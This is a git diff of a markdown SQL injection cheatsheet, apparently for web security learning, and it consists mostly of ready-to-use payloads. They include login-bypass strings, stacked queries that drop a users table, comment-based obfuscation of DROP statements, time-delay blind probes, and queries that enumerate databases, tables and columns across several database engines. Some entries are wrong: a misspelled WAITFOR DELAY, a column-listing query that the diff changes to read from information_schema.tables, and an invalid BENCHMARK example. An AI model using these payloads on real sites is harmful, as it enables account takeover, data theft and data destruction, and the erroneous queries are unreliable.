@@ -1,12 +1,12 @@
 # SQLi Cheatsheet
-
 - [SQLi Cheatsheet](#sqli-cheatsheet)
   - [Safe `OR` Based Payloads](#safe-or-based-payloads)
   - [Comments](#comments)
     - [Line Comments](#line-comments)
-      - [Example](#example)
     - [Inline Comments (For Obfuscation)](#inline-comments-for-obfuscation)
-      - [Example](#example-1)
+      - [Example](#example)
+  - [Batch Execution (Query Stacking)](#batch-execution-query-stacking)
+    - [Example](#example-1)
   - [Conditional Boolean Errors](#conditional-boolean-errors)
     - [MySQL](#mysql)
     - [SQL Server](#sql-server)
@@ -17,6 +17,7 @@
     - [Concatenation](#concatenation)
       - [Through Operators](#through-operators)
         - [Example (Concatenating Multiple Columns)](#example-concatenating-multiple-columns)
+        - [Example (Obfuscating URL Parameter)](#example-obfuscating-url-parameter)
       - [Through Functions](#through-functions)
         - [Example (Concatenating Multiple Columns)](#example-concatenating-multiple-columns-1)
     - [Conversion Functions](#conversion-functions)
@@ -30,68 +31,62 @@
   - [List All The DataBases In The Server](#list-all-the-databases-in-the-server)
   - [List All The Tables In A DataBase](#list-all-the-tables-in-a-database)
   - [List All The Columns In A Table](#list-all-the-columns-in-a-table)
+  - [Login Bypass](#login-bypass)
+  - [Enumerate Column's Data Type](#enumerate-columns-data-type)
+  - [Trigger Time Delays](#trigger-time-delays)
+    - [Example](#example-2)
 - [References](#references)
 
 ## Safe `OR` Based Payloads
 **Note: Use `'OR 1=1--` Responsibly**
-| Payload | Works On |
+| Applicability | Payload |
 | - | - |
-| `' OR IF((NOW()=SYSDATE()),SLEEP(5),1)='0` | MySQL |
-| ' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1` | PostgreSQL |
-| `' OR ROWNUM = '1` | Oracle |
-| `' OR ROWID = '1` | SQLite |
+| MySQL | `' OR IF((NOW()=SYSDATE()),SLEEP(5),1)='0` |
+| Oracle | `' OR ROWNUM = '1` |
+| SQLite | `' OR ROWID = '1` |
 
 ## Comments
 ### Line Comments
-| Payload | Works On |
+| Applicability | Payload |
 | - | - |
-| **--** | Oracle, SQL Server, PostgreSQL, SQLite, MySQL |
-| **-- -** | MySQL |
-| **#** | MySQL |
-
-#### Example
-```SQL
-'admin--  
-```
+| Oracle, SQL Server, PostgreSQL, SQLite, MySQL | **--** |
+| MySQL | **-- -** |
+| | **#** |
 
 ### Inline Comments (For Obfuscation)
-| Payload | Works On |
+| Applicability | Payload | 
 | - | - |
-| **/\*Comment\*/** | Oracle, SQL Server, PostgreSQL, SQLite, MySQL| 
-| **/\*! MYSQL special comment format \*/** | MySQL |
+| Oracle, SQL Server, PostgreSQL, SQLite, MySQL | **/\*Comment\*/** | 
+| MySQL | **/\*! MYSQL special comment format \*/** |
 
 #### Example
-+ Obfuscate the original query.
-  ```SQL
-  DROP table_name;
+Obfuscate the original query.
+```SQL
+DROP table_name;
 
-  <!-- becomes -->
-  
-  DROP /*COMMENT*/ table_name;
-  <!-- OR -->
-  DR/**/OP /*COMMENT*/ table_name;
-  ```
+<!-- becomes -->
 
-+ Removing spaces.
-  ```SQL
-  SELECT pass FROM users;
+DROP /*COMMENT*/ table_name;
+<!-- OR -->
+DR/**/OP /*COMMENT*/ table_name;
+```
 
-  <!-- becomes -->
+Removing spaces.
+```SQL
+SELECT pass FROM users;
 
-  SELECT/*ignore*/pass/*ignore*/FROM/*ignore*/users;
-  ```
+<!-- becomes -->
 
-+ Detecting MySQL:
-  ```SQL
-  /*! MYSQL special comment format */
+SELECT/*ignore*/pass/*ignore*/FROM/*ignore*/users;
+```
 
-  SELECT /*!80027 1/0, */ 1 FROM tablename 
-  ```
-  > Will throw an division by 0 error if MySQL version is higher than 8.0.27
+Detecting MySQL.
+```SQL
+/*! MYSQL special comment format */
 
-+ ```SQL
-  SELECT id FROM table_ WHERE id=10' DROP TABLE users /* 
-  ```
+SELECT /*!80027 1/0, */ 1 FROM tablename 
+```
+> Will throw an division by 0 error if MySQL version is higher than 8.0.27
 
 ## Batch Execution (Query Stacking)
 Works only in MySQL, SQL Server & PostgreSQL.
@@ -100,7 +95,7 @@ Works only in MySQL, SQL Server & PostgreSQL.
 ```SQL
 SELECT * FROM users WHERE username='admin'; DROP TABLE users; /* ' AND pass='abcd';
 ```
-As the results from the second query is not returned, we have to use blind SQLi methods to confirm that.
+> As the results from the second query is not returned, we have to use blind SQLi methods to confirm that.
 
 ## Conditional Boolean Errors 
 Includes `IF` statements & `CASE` statements.
@@ -181,6 +176,17 @@ SELECT login || '-' || password FROM members
 
 admin-admin1234
 admin@mail.com-admin1234
+```
+
+##### Example (Obfuscating URL Parameter)
+```url
+/products?id=1
+<!-- becomes -->
+/products?id=5-4
+
+/books?id='book'
+<!-- becomes -->
+/books?id='bo'||'ok'
 ```
 
 #### Through Functions
@@ -274,7 +280,6 @@ SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
 | SQLite | `SUBSTRING('main_string', START_POSITION, SUB_STRING_LENGTH)` |
 | | `SUBSTR('main_string', START_POSITION, SUB_STRING_LENGTH)` |
 
-
 ### String Length Calculation
 | Applicability | Payload | Notes |
 | - | - | - |
@@ -316,6 +321,7 @@ SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
 | SQL Server | `@@VERSION` |
 | Oracle | `SELECT BANNER FROM v$version WHERE ROWNUM = 1` |
 | | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1` |
+| | `SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%'` |
 | SQLite | `sqlite_version()` |
 
 ## Current DataBase In Use
@@ -359,16 +365,79 @@ SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
 ## List All The Columns In A Table
 | Applicability | Payload |
 | - | - |
-| MySQL, PostgreSQL | `SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='TABLE_NAME' AND table_schema='DBNAME'` |
+| MySQL, PostgreSQL | `SELECT column_name,column_type FROM information_schema.tables WHERE table_name='TABLE_NAME' AND table_schema='DBNAME'` |
 | SQL Server | `SELECT COL_NAME(OBJECT_ID('DBNAME.TABLE_NAME'), <INDEX>)` |
 | Oracle | `SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='TABLE_NAME' AND OWNER='DBNAME'` |
 | SQLite | `SELECT name FROM PRAGMA_TABLE_INFO('TABLE_NAME')` |
 | | `SELECT sql FROM sqlite_master WHERE tbl_name='TABLE_NAME'` |
 
+## Login Bypass
+```SQL
+admin' --
+admin' #
+admin'/*
 
+' or 1=1--
+' or 1=1#
+' or 1=1/*
 
+') or '1'='1--
+') or ('1'='1--
+```
 
+## Enumerate Column's Data Type
+1. Use `SUM()` aggregate function to intentionally provoke error for non-numeric values.
+  ```SQL
+  <!-- SQL Server -->
+  ' UNION SELECT SUM(column);--
+  ' UNION SELECT SUM('hello');--
+  ```
+  ```bash
+  ERROR: The sum or average aggregate operation cannot take a varchar data type as an argument.
+  ```
+  > If there is no error, the column is numeric.
 
+2. Use `CAST()`
+  ```SQL
+  SELECT CAST('abc' AS INT)
+  ```
+  ```bash
+  Error: Conversion failed when converting the varchar value 'abc' to data type int.
+  ```
+
+3. Use `CONVERT()`
+  ```SQL
+  SELECT CONVERT(INT, 'abc');
+  ```
+  ```bash
+  Error: Conversion failed when converting the varchar value 'abc' to data type int.
+  ```
+
+## Trigger Time Delays
+| Applicability | Payload |
+| - | - |
+| MySQL, MariaDB | `SELECT SLEEP(5);` |
+| | `SELECT BENCHMARK(repeats, expression_to_execute);` |
+| PostgreSQL | `SELECT pg_sleep(5)` | 
+| SQL Server | `WAITFOR DEALY '00:00:05';` |
+| | `WAITFOR DEALY '0:0:05';` |
+| Oracle | `DBMS_LOCK.sleep(5);` |
+| | `DBMS_PIPE.RECEIVE_MESSAGE('STR',5)` |
+
+### Example
+```SQL
+<!-- Example: checking if a table exists -->
+IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
+```
+----
+```SQL
+<!-- No delay -->
+' IF (1=2) THEN SLEEP(5) ELSE '' END-- -
+
+<!-- Yes delay -->
+' IF (1=1) THEN SLEEP(5)-- -
+' || pg_sleep(10)--
+```
 
 # References
 + PortSwigger Web Security Academy
